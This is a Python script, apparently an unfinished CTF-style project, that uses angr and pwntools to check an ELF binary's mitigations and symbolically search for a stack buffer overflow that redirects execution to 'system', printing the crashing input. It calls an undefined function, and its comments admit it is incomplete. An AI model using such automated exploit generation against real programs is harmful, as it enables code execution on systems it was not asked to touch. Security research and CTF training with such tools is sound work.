#!/usr/bin/env python3

from pwn import *
import claripy
import angr
import sys
import boflen

name =  sys.argv[1]
proj = angr.Project(name,auto_load_libs=False)
state = proj.factory.entry_state(stdin=angr.SimFile)
binary = ELF(name)
function = {}
properties = {}
unconstrained_input = False
len_unconstrained_input = -1
simgr = proj.factory.simulation_manager(state,save_unconstrained=True)
simgr.stashes['bof'] = []
crashing_input = ""
win_addr = 0

def findmitigation():
	# reference: https://github.com/ChrisTheCoolHut/Zeratool/blob/master/lib/protectionDetector.py
	# other trials. 
	# not sure if the function is really required because any value can be accessed using binary.smth
	# might be required when splitting the code into multiple python files
	'''
	if(proj.loader.main_object.execstack== True):
		print("NX is enabled")
	elif(proj.loader.main_object.pic == True):
		print("PIE is enabled")
	'''
	properties['aslr'] = binary.aslr
	properties['arch'] = binary.arch
	properties['canary'] = binary.canary
	properties['got'] = binary.got
	properties['nx'] = binary.nx
	properties['pie'] = binary.pie
	properties['plt'] = binary.plt
	properties['relro'] = binary.relro
	return properties

	
def find_win(simgr):
	global win_addr
	# finding win functions in the binary and trying to call it
	# incomplete and failed implementation of the above
	if ("system" in function): 

		win_addr = function["system"]
		simgr.explore(find = win_addr)
		if simgr.found:
			sol = simgr.found[0]
			print(sol.posix.dumps(0))
		return 1
	return 0
	

def find_bof(simgr):
	global crashing_input
	# working of simgr and stashes: https://github.com/angr/angr-doc/blob/master/docs/pathgroups.md
	if len(simgr.unconstrained):
	# finding unconstrained path to overwrite the return address with "CCCC"*2
		for path in simgr.unconstrained:
			#if path.satisfiable(extra_constraints=[path.regs.pc == b"CCCC"*2]): 
			path.add_constraints(path.regs.pc == p64(function['system']))
			if path.satisfiable():
				# input_data = state.posix.stdin.load(0, state.posix.stdin.size) <-- to create a bitvector of the input size
				simgr.stashes['bof'].append(path)
				unconstrained_state = path
				crashing_input = unconstrained_state.posix.dumps(0)
				print(len(crashing_input))
			simgr.stashes['unconstrained'].remove(path)
			simgr.drop(stash='active')
	return simgr	


def prog_state(state):
# additional condition for gets as it is undetected in the search for unconstrained path
	if("gets" in function):
		unconstrained_input = True
		print("[+] gets found")
		 # do something to reach till the input function and check for buffer size
		 # buffer_input_size > buffer_declared_size
	else:
		simgr.explore(step_func = find_bof)
		if(simgr.stashes['bof'] != []):
			print("[+] overflow detected")
			print("[+] len of crashing input {}".format(len(crashing_input)))
			print(crashing_input)
			if(binary.canary == False):
				print("[+] no canary detected")
			else:
				print("[+] canary detected")
		else:
			print("[+] no overflow detected")



findfunctions()
prog_state(state)
find_win(simgr)






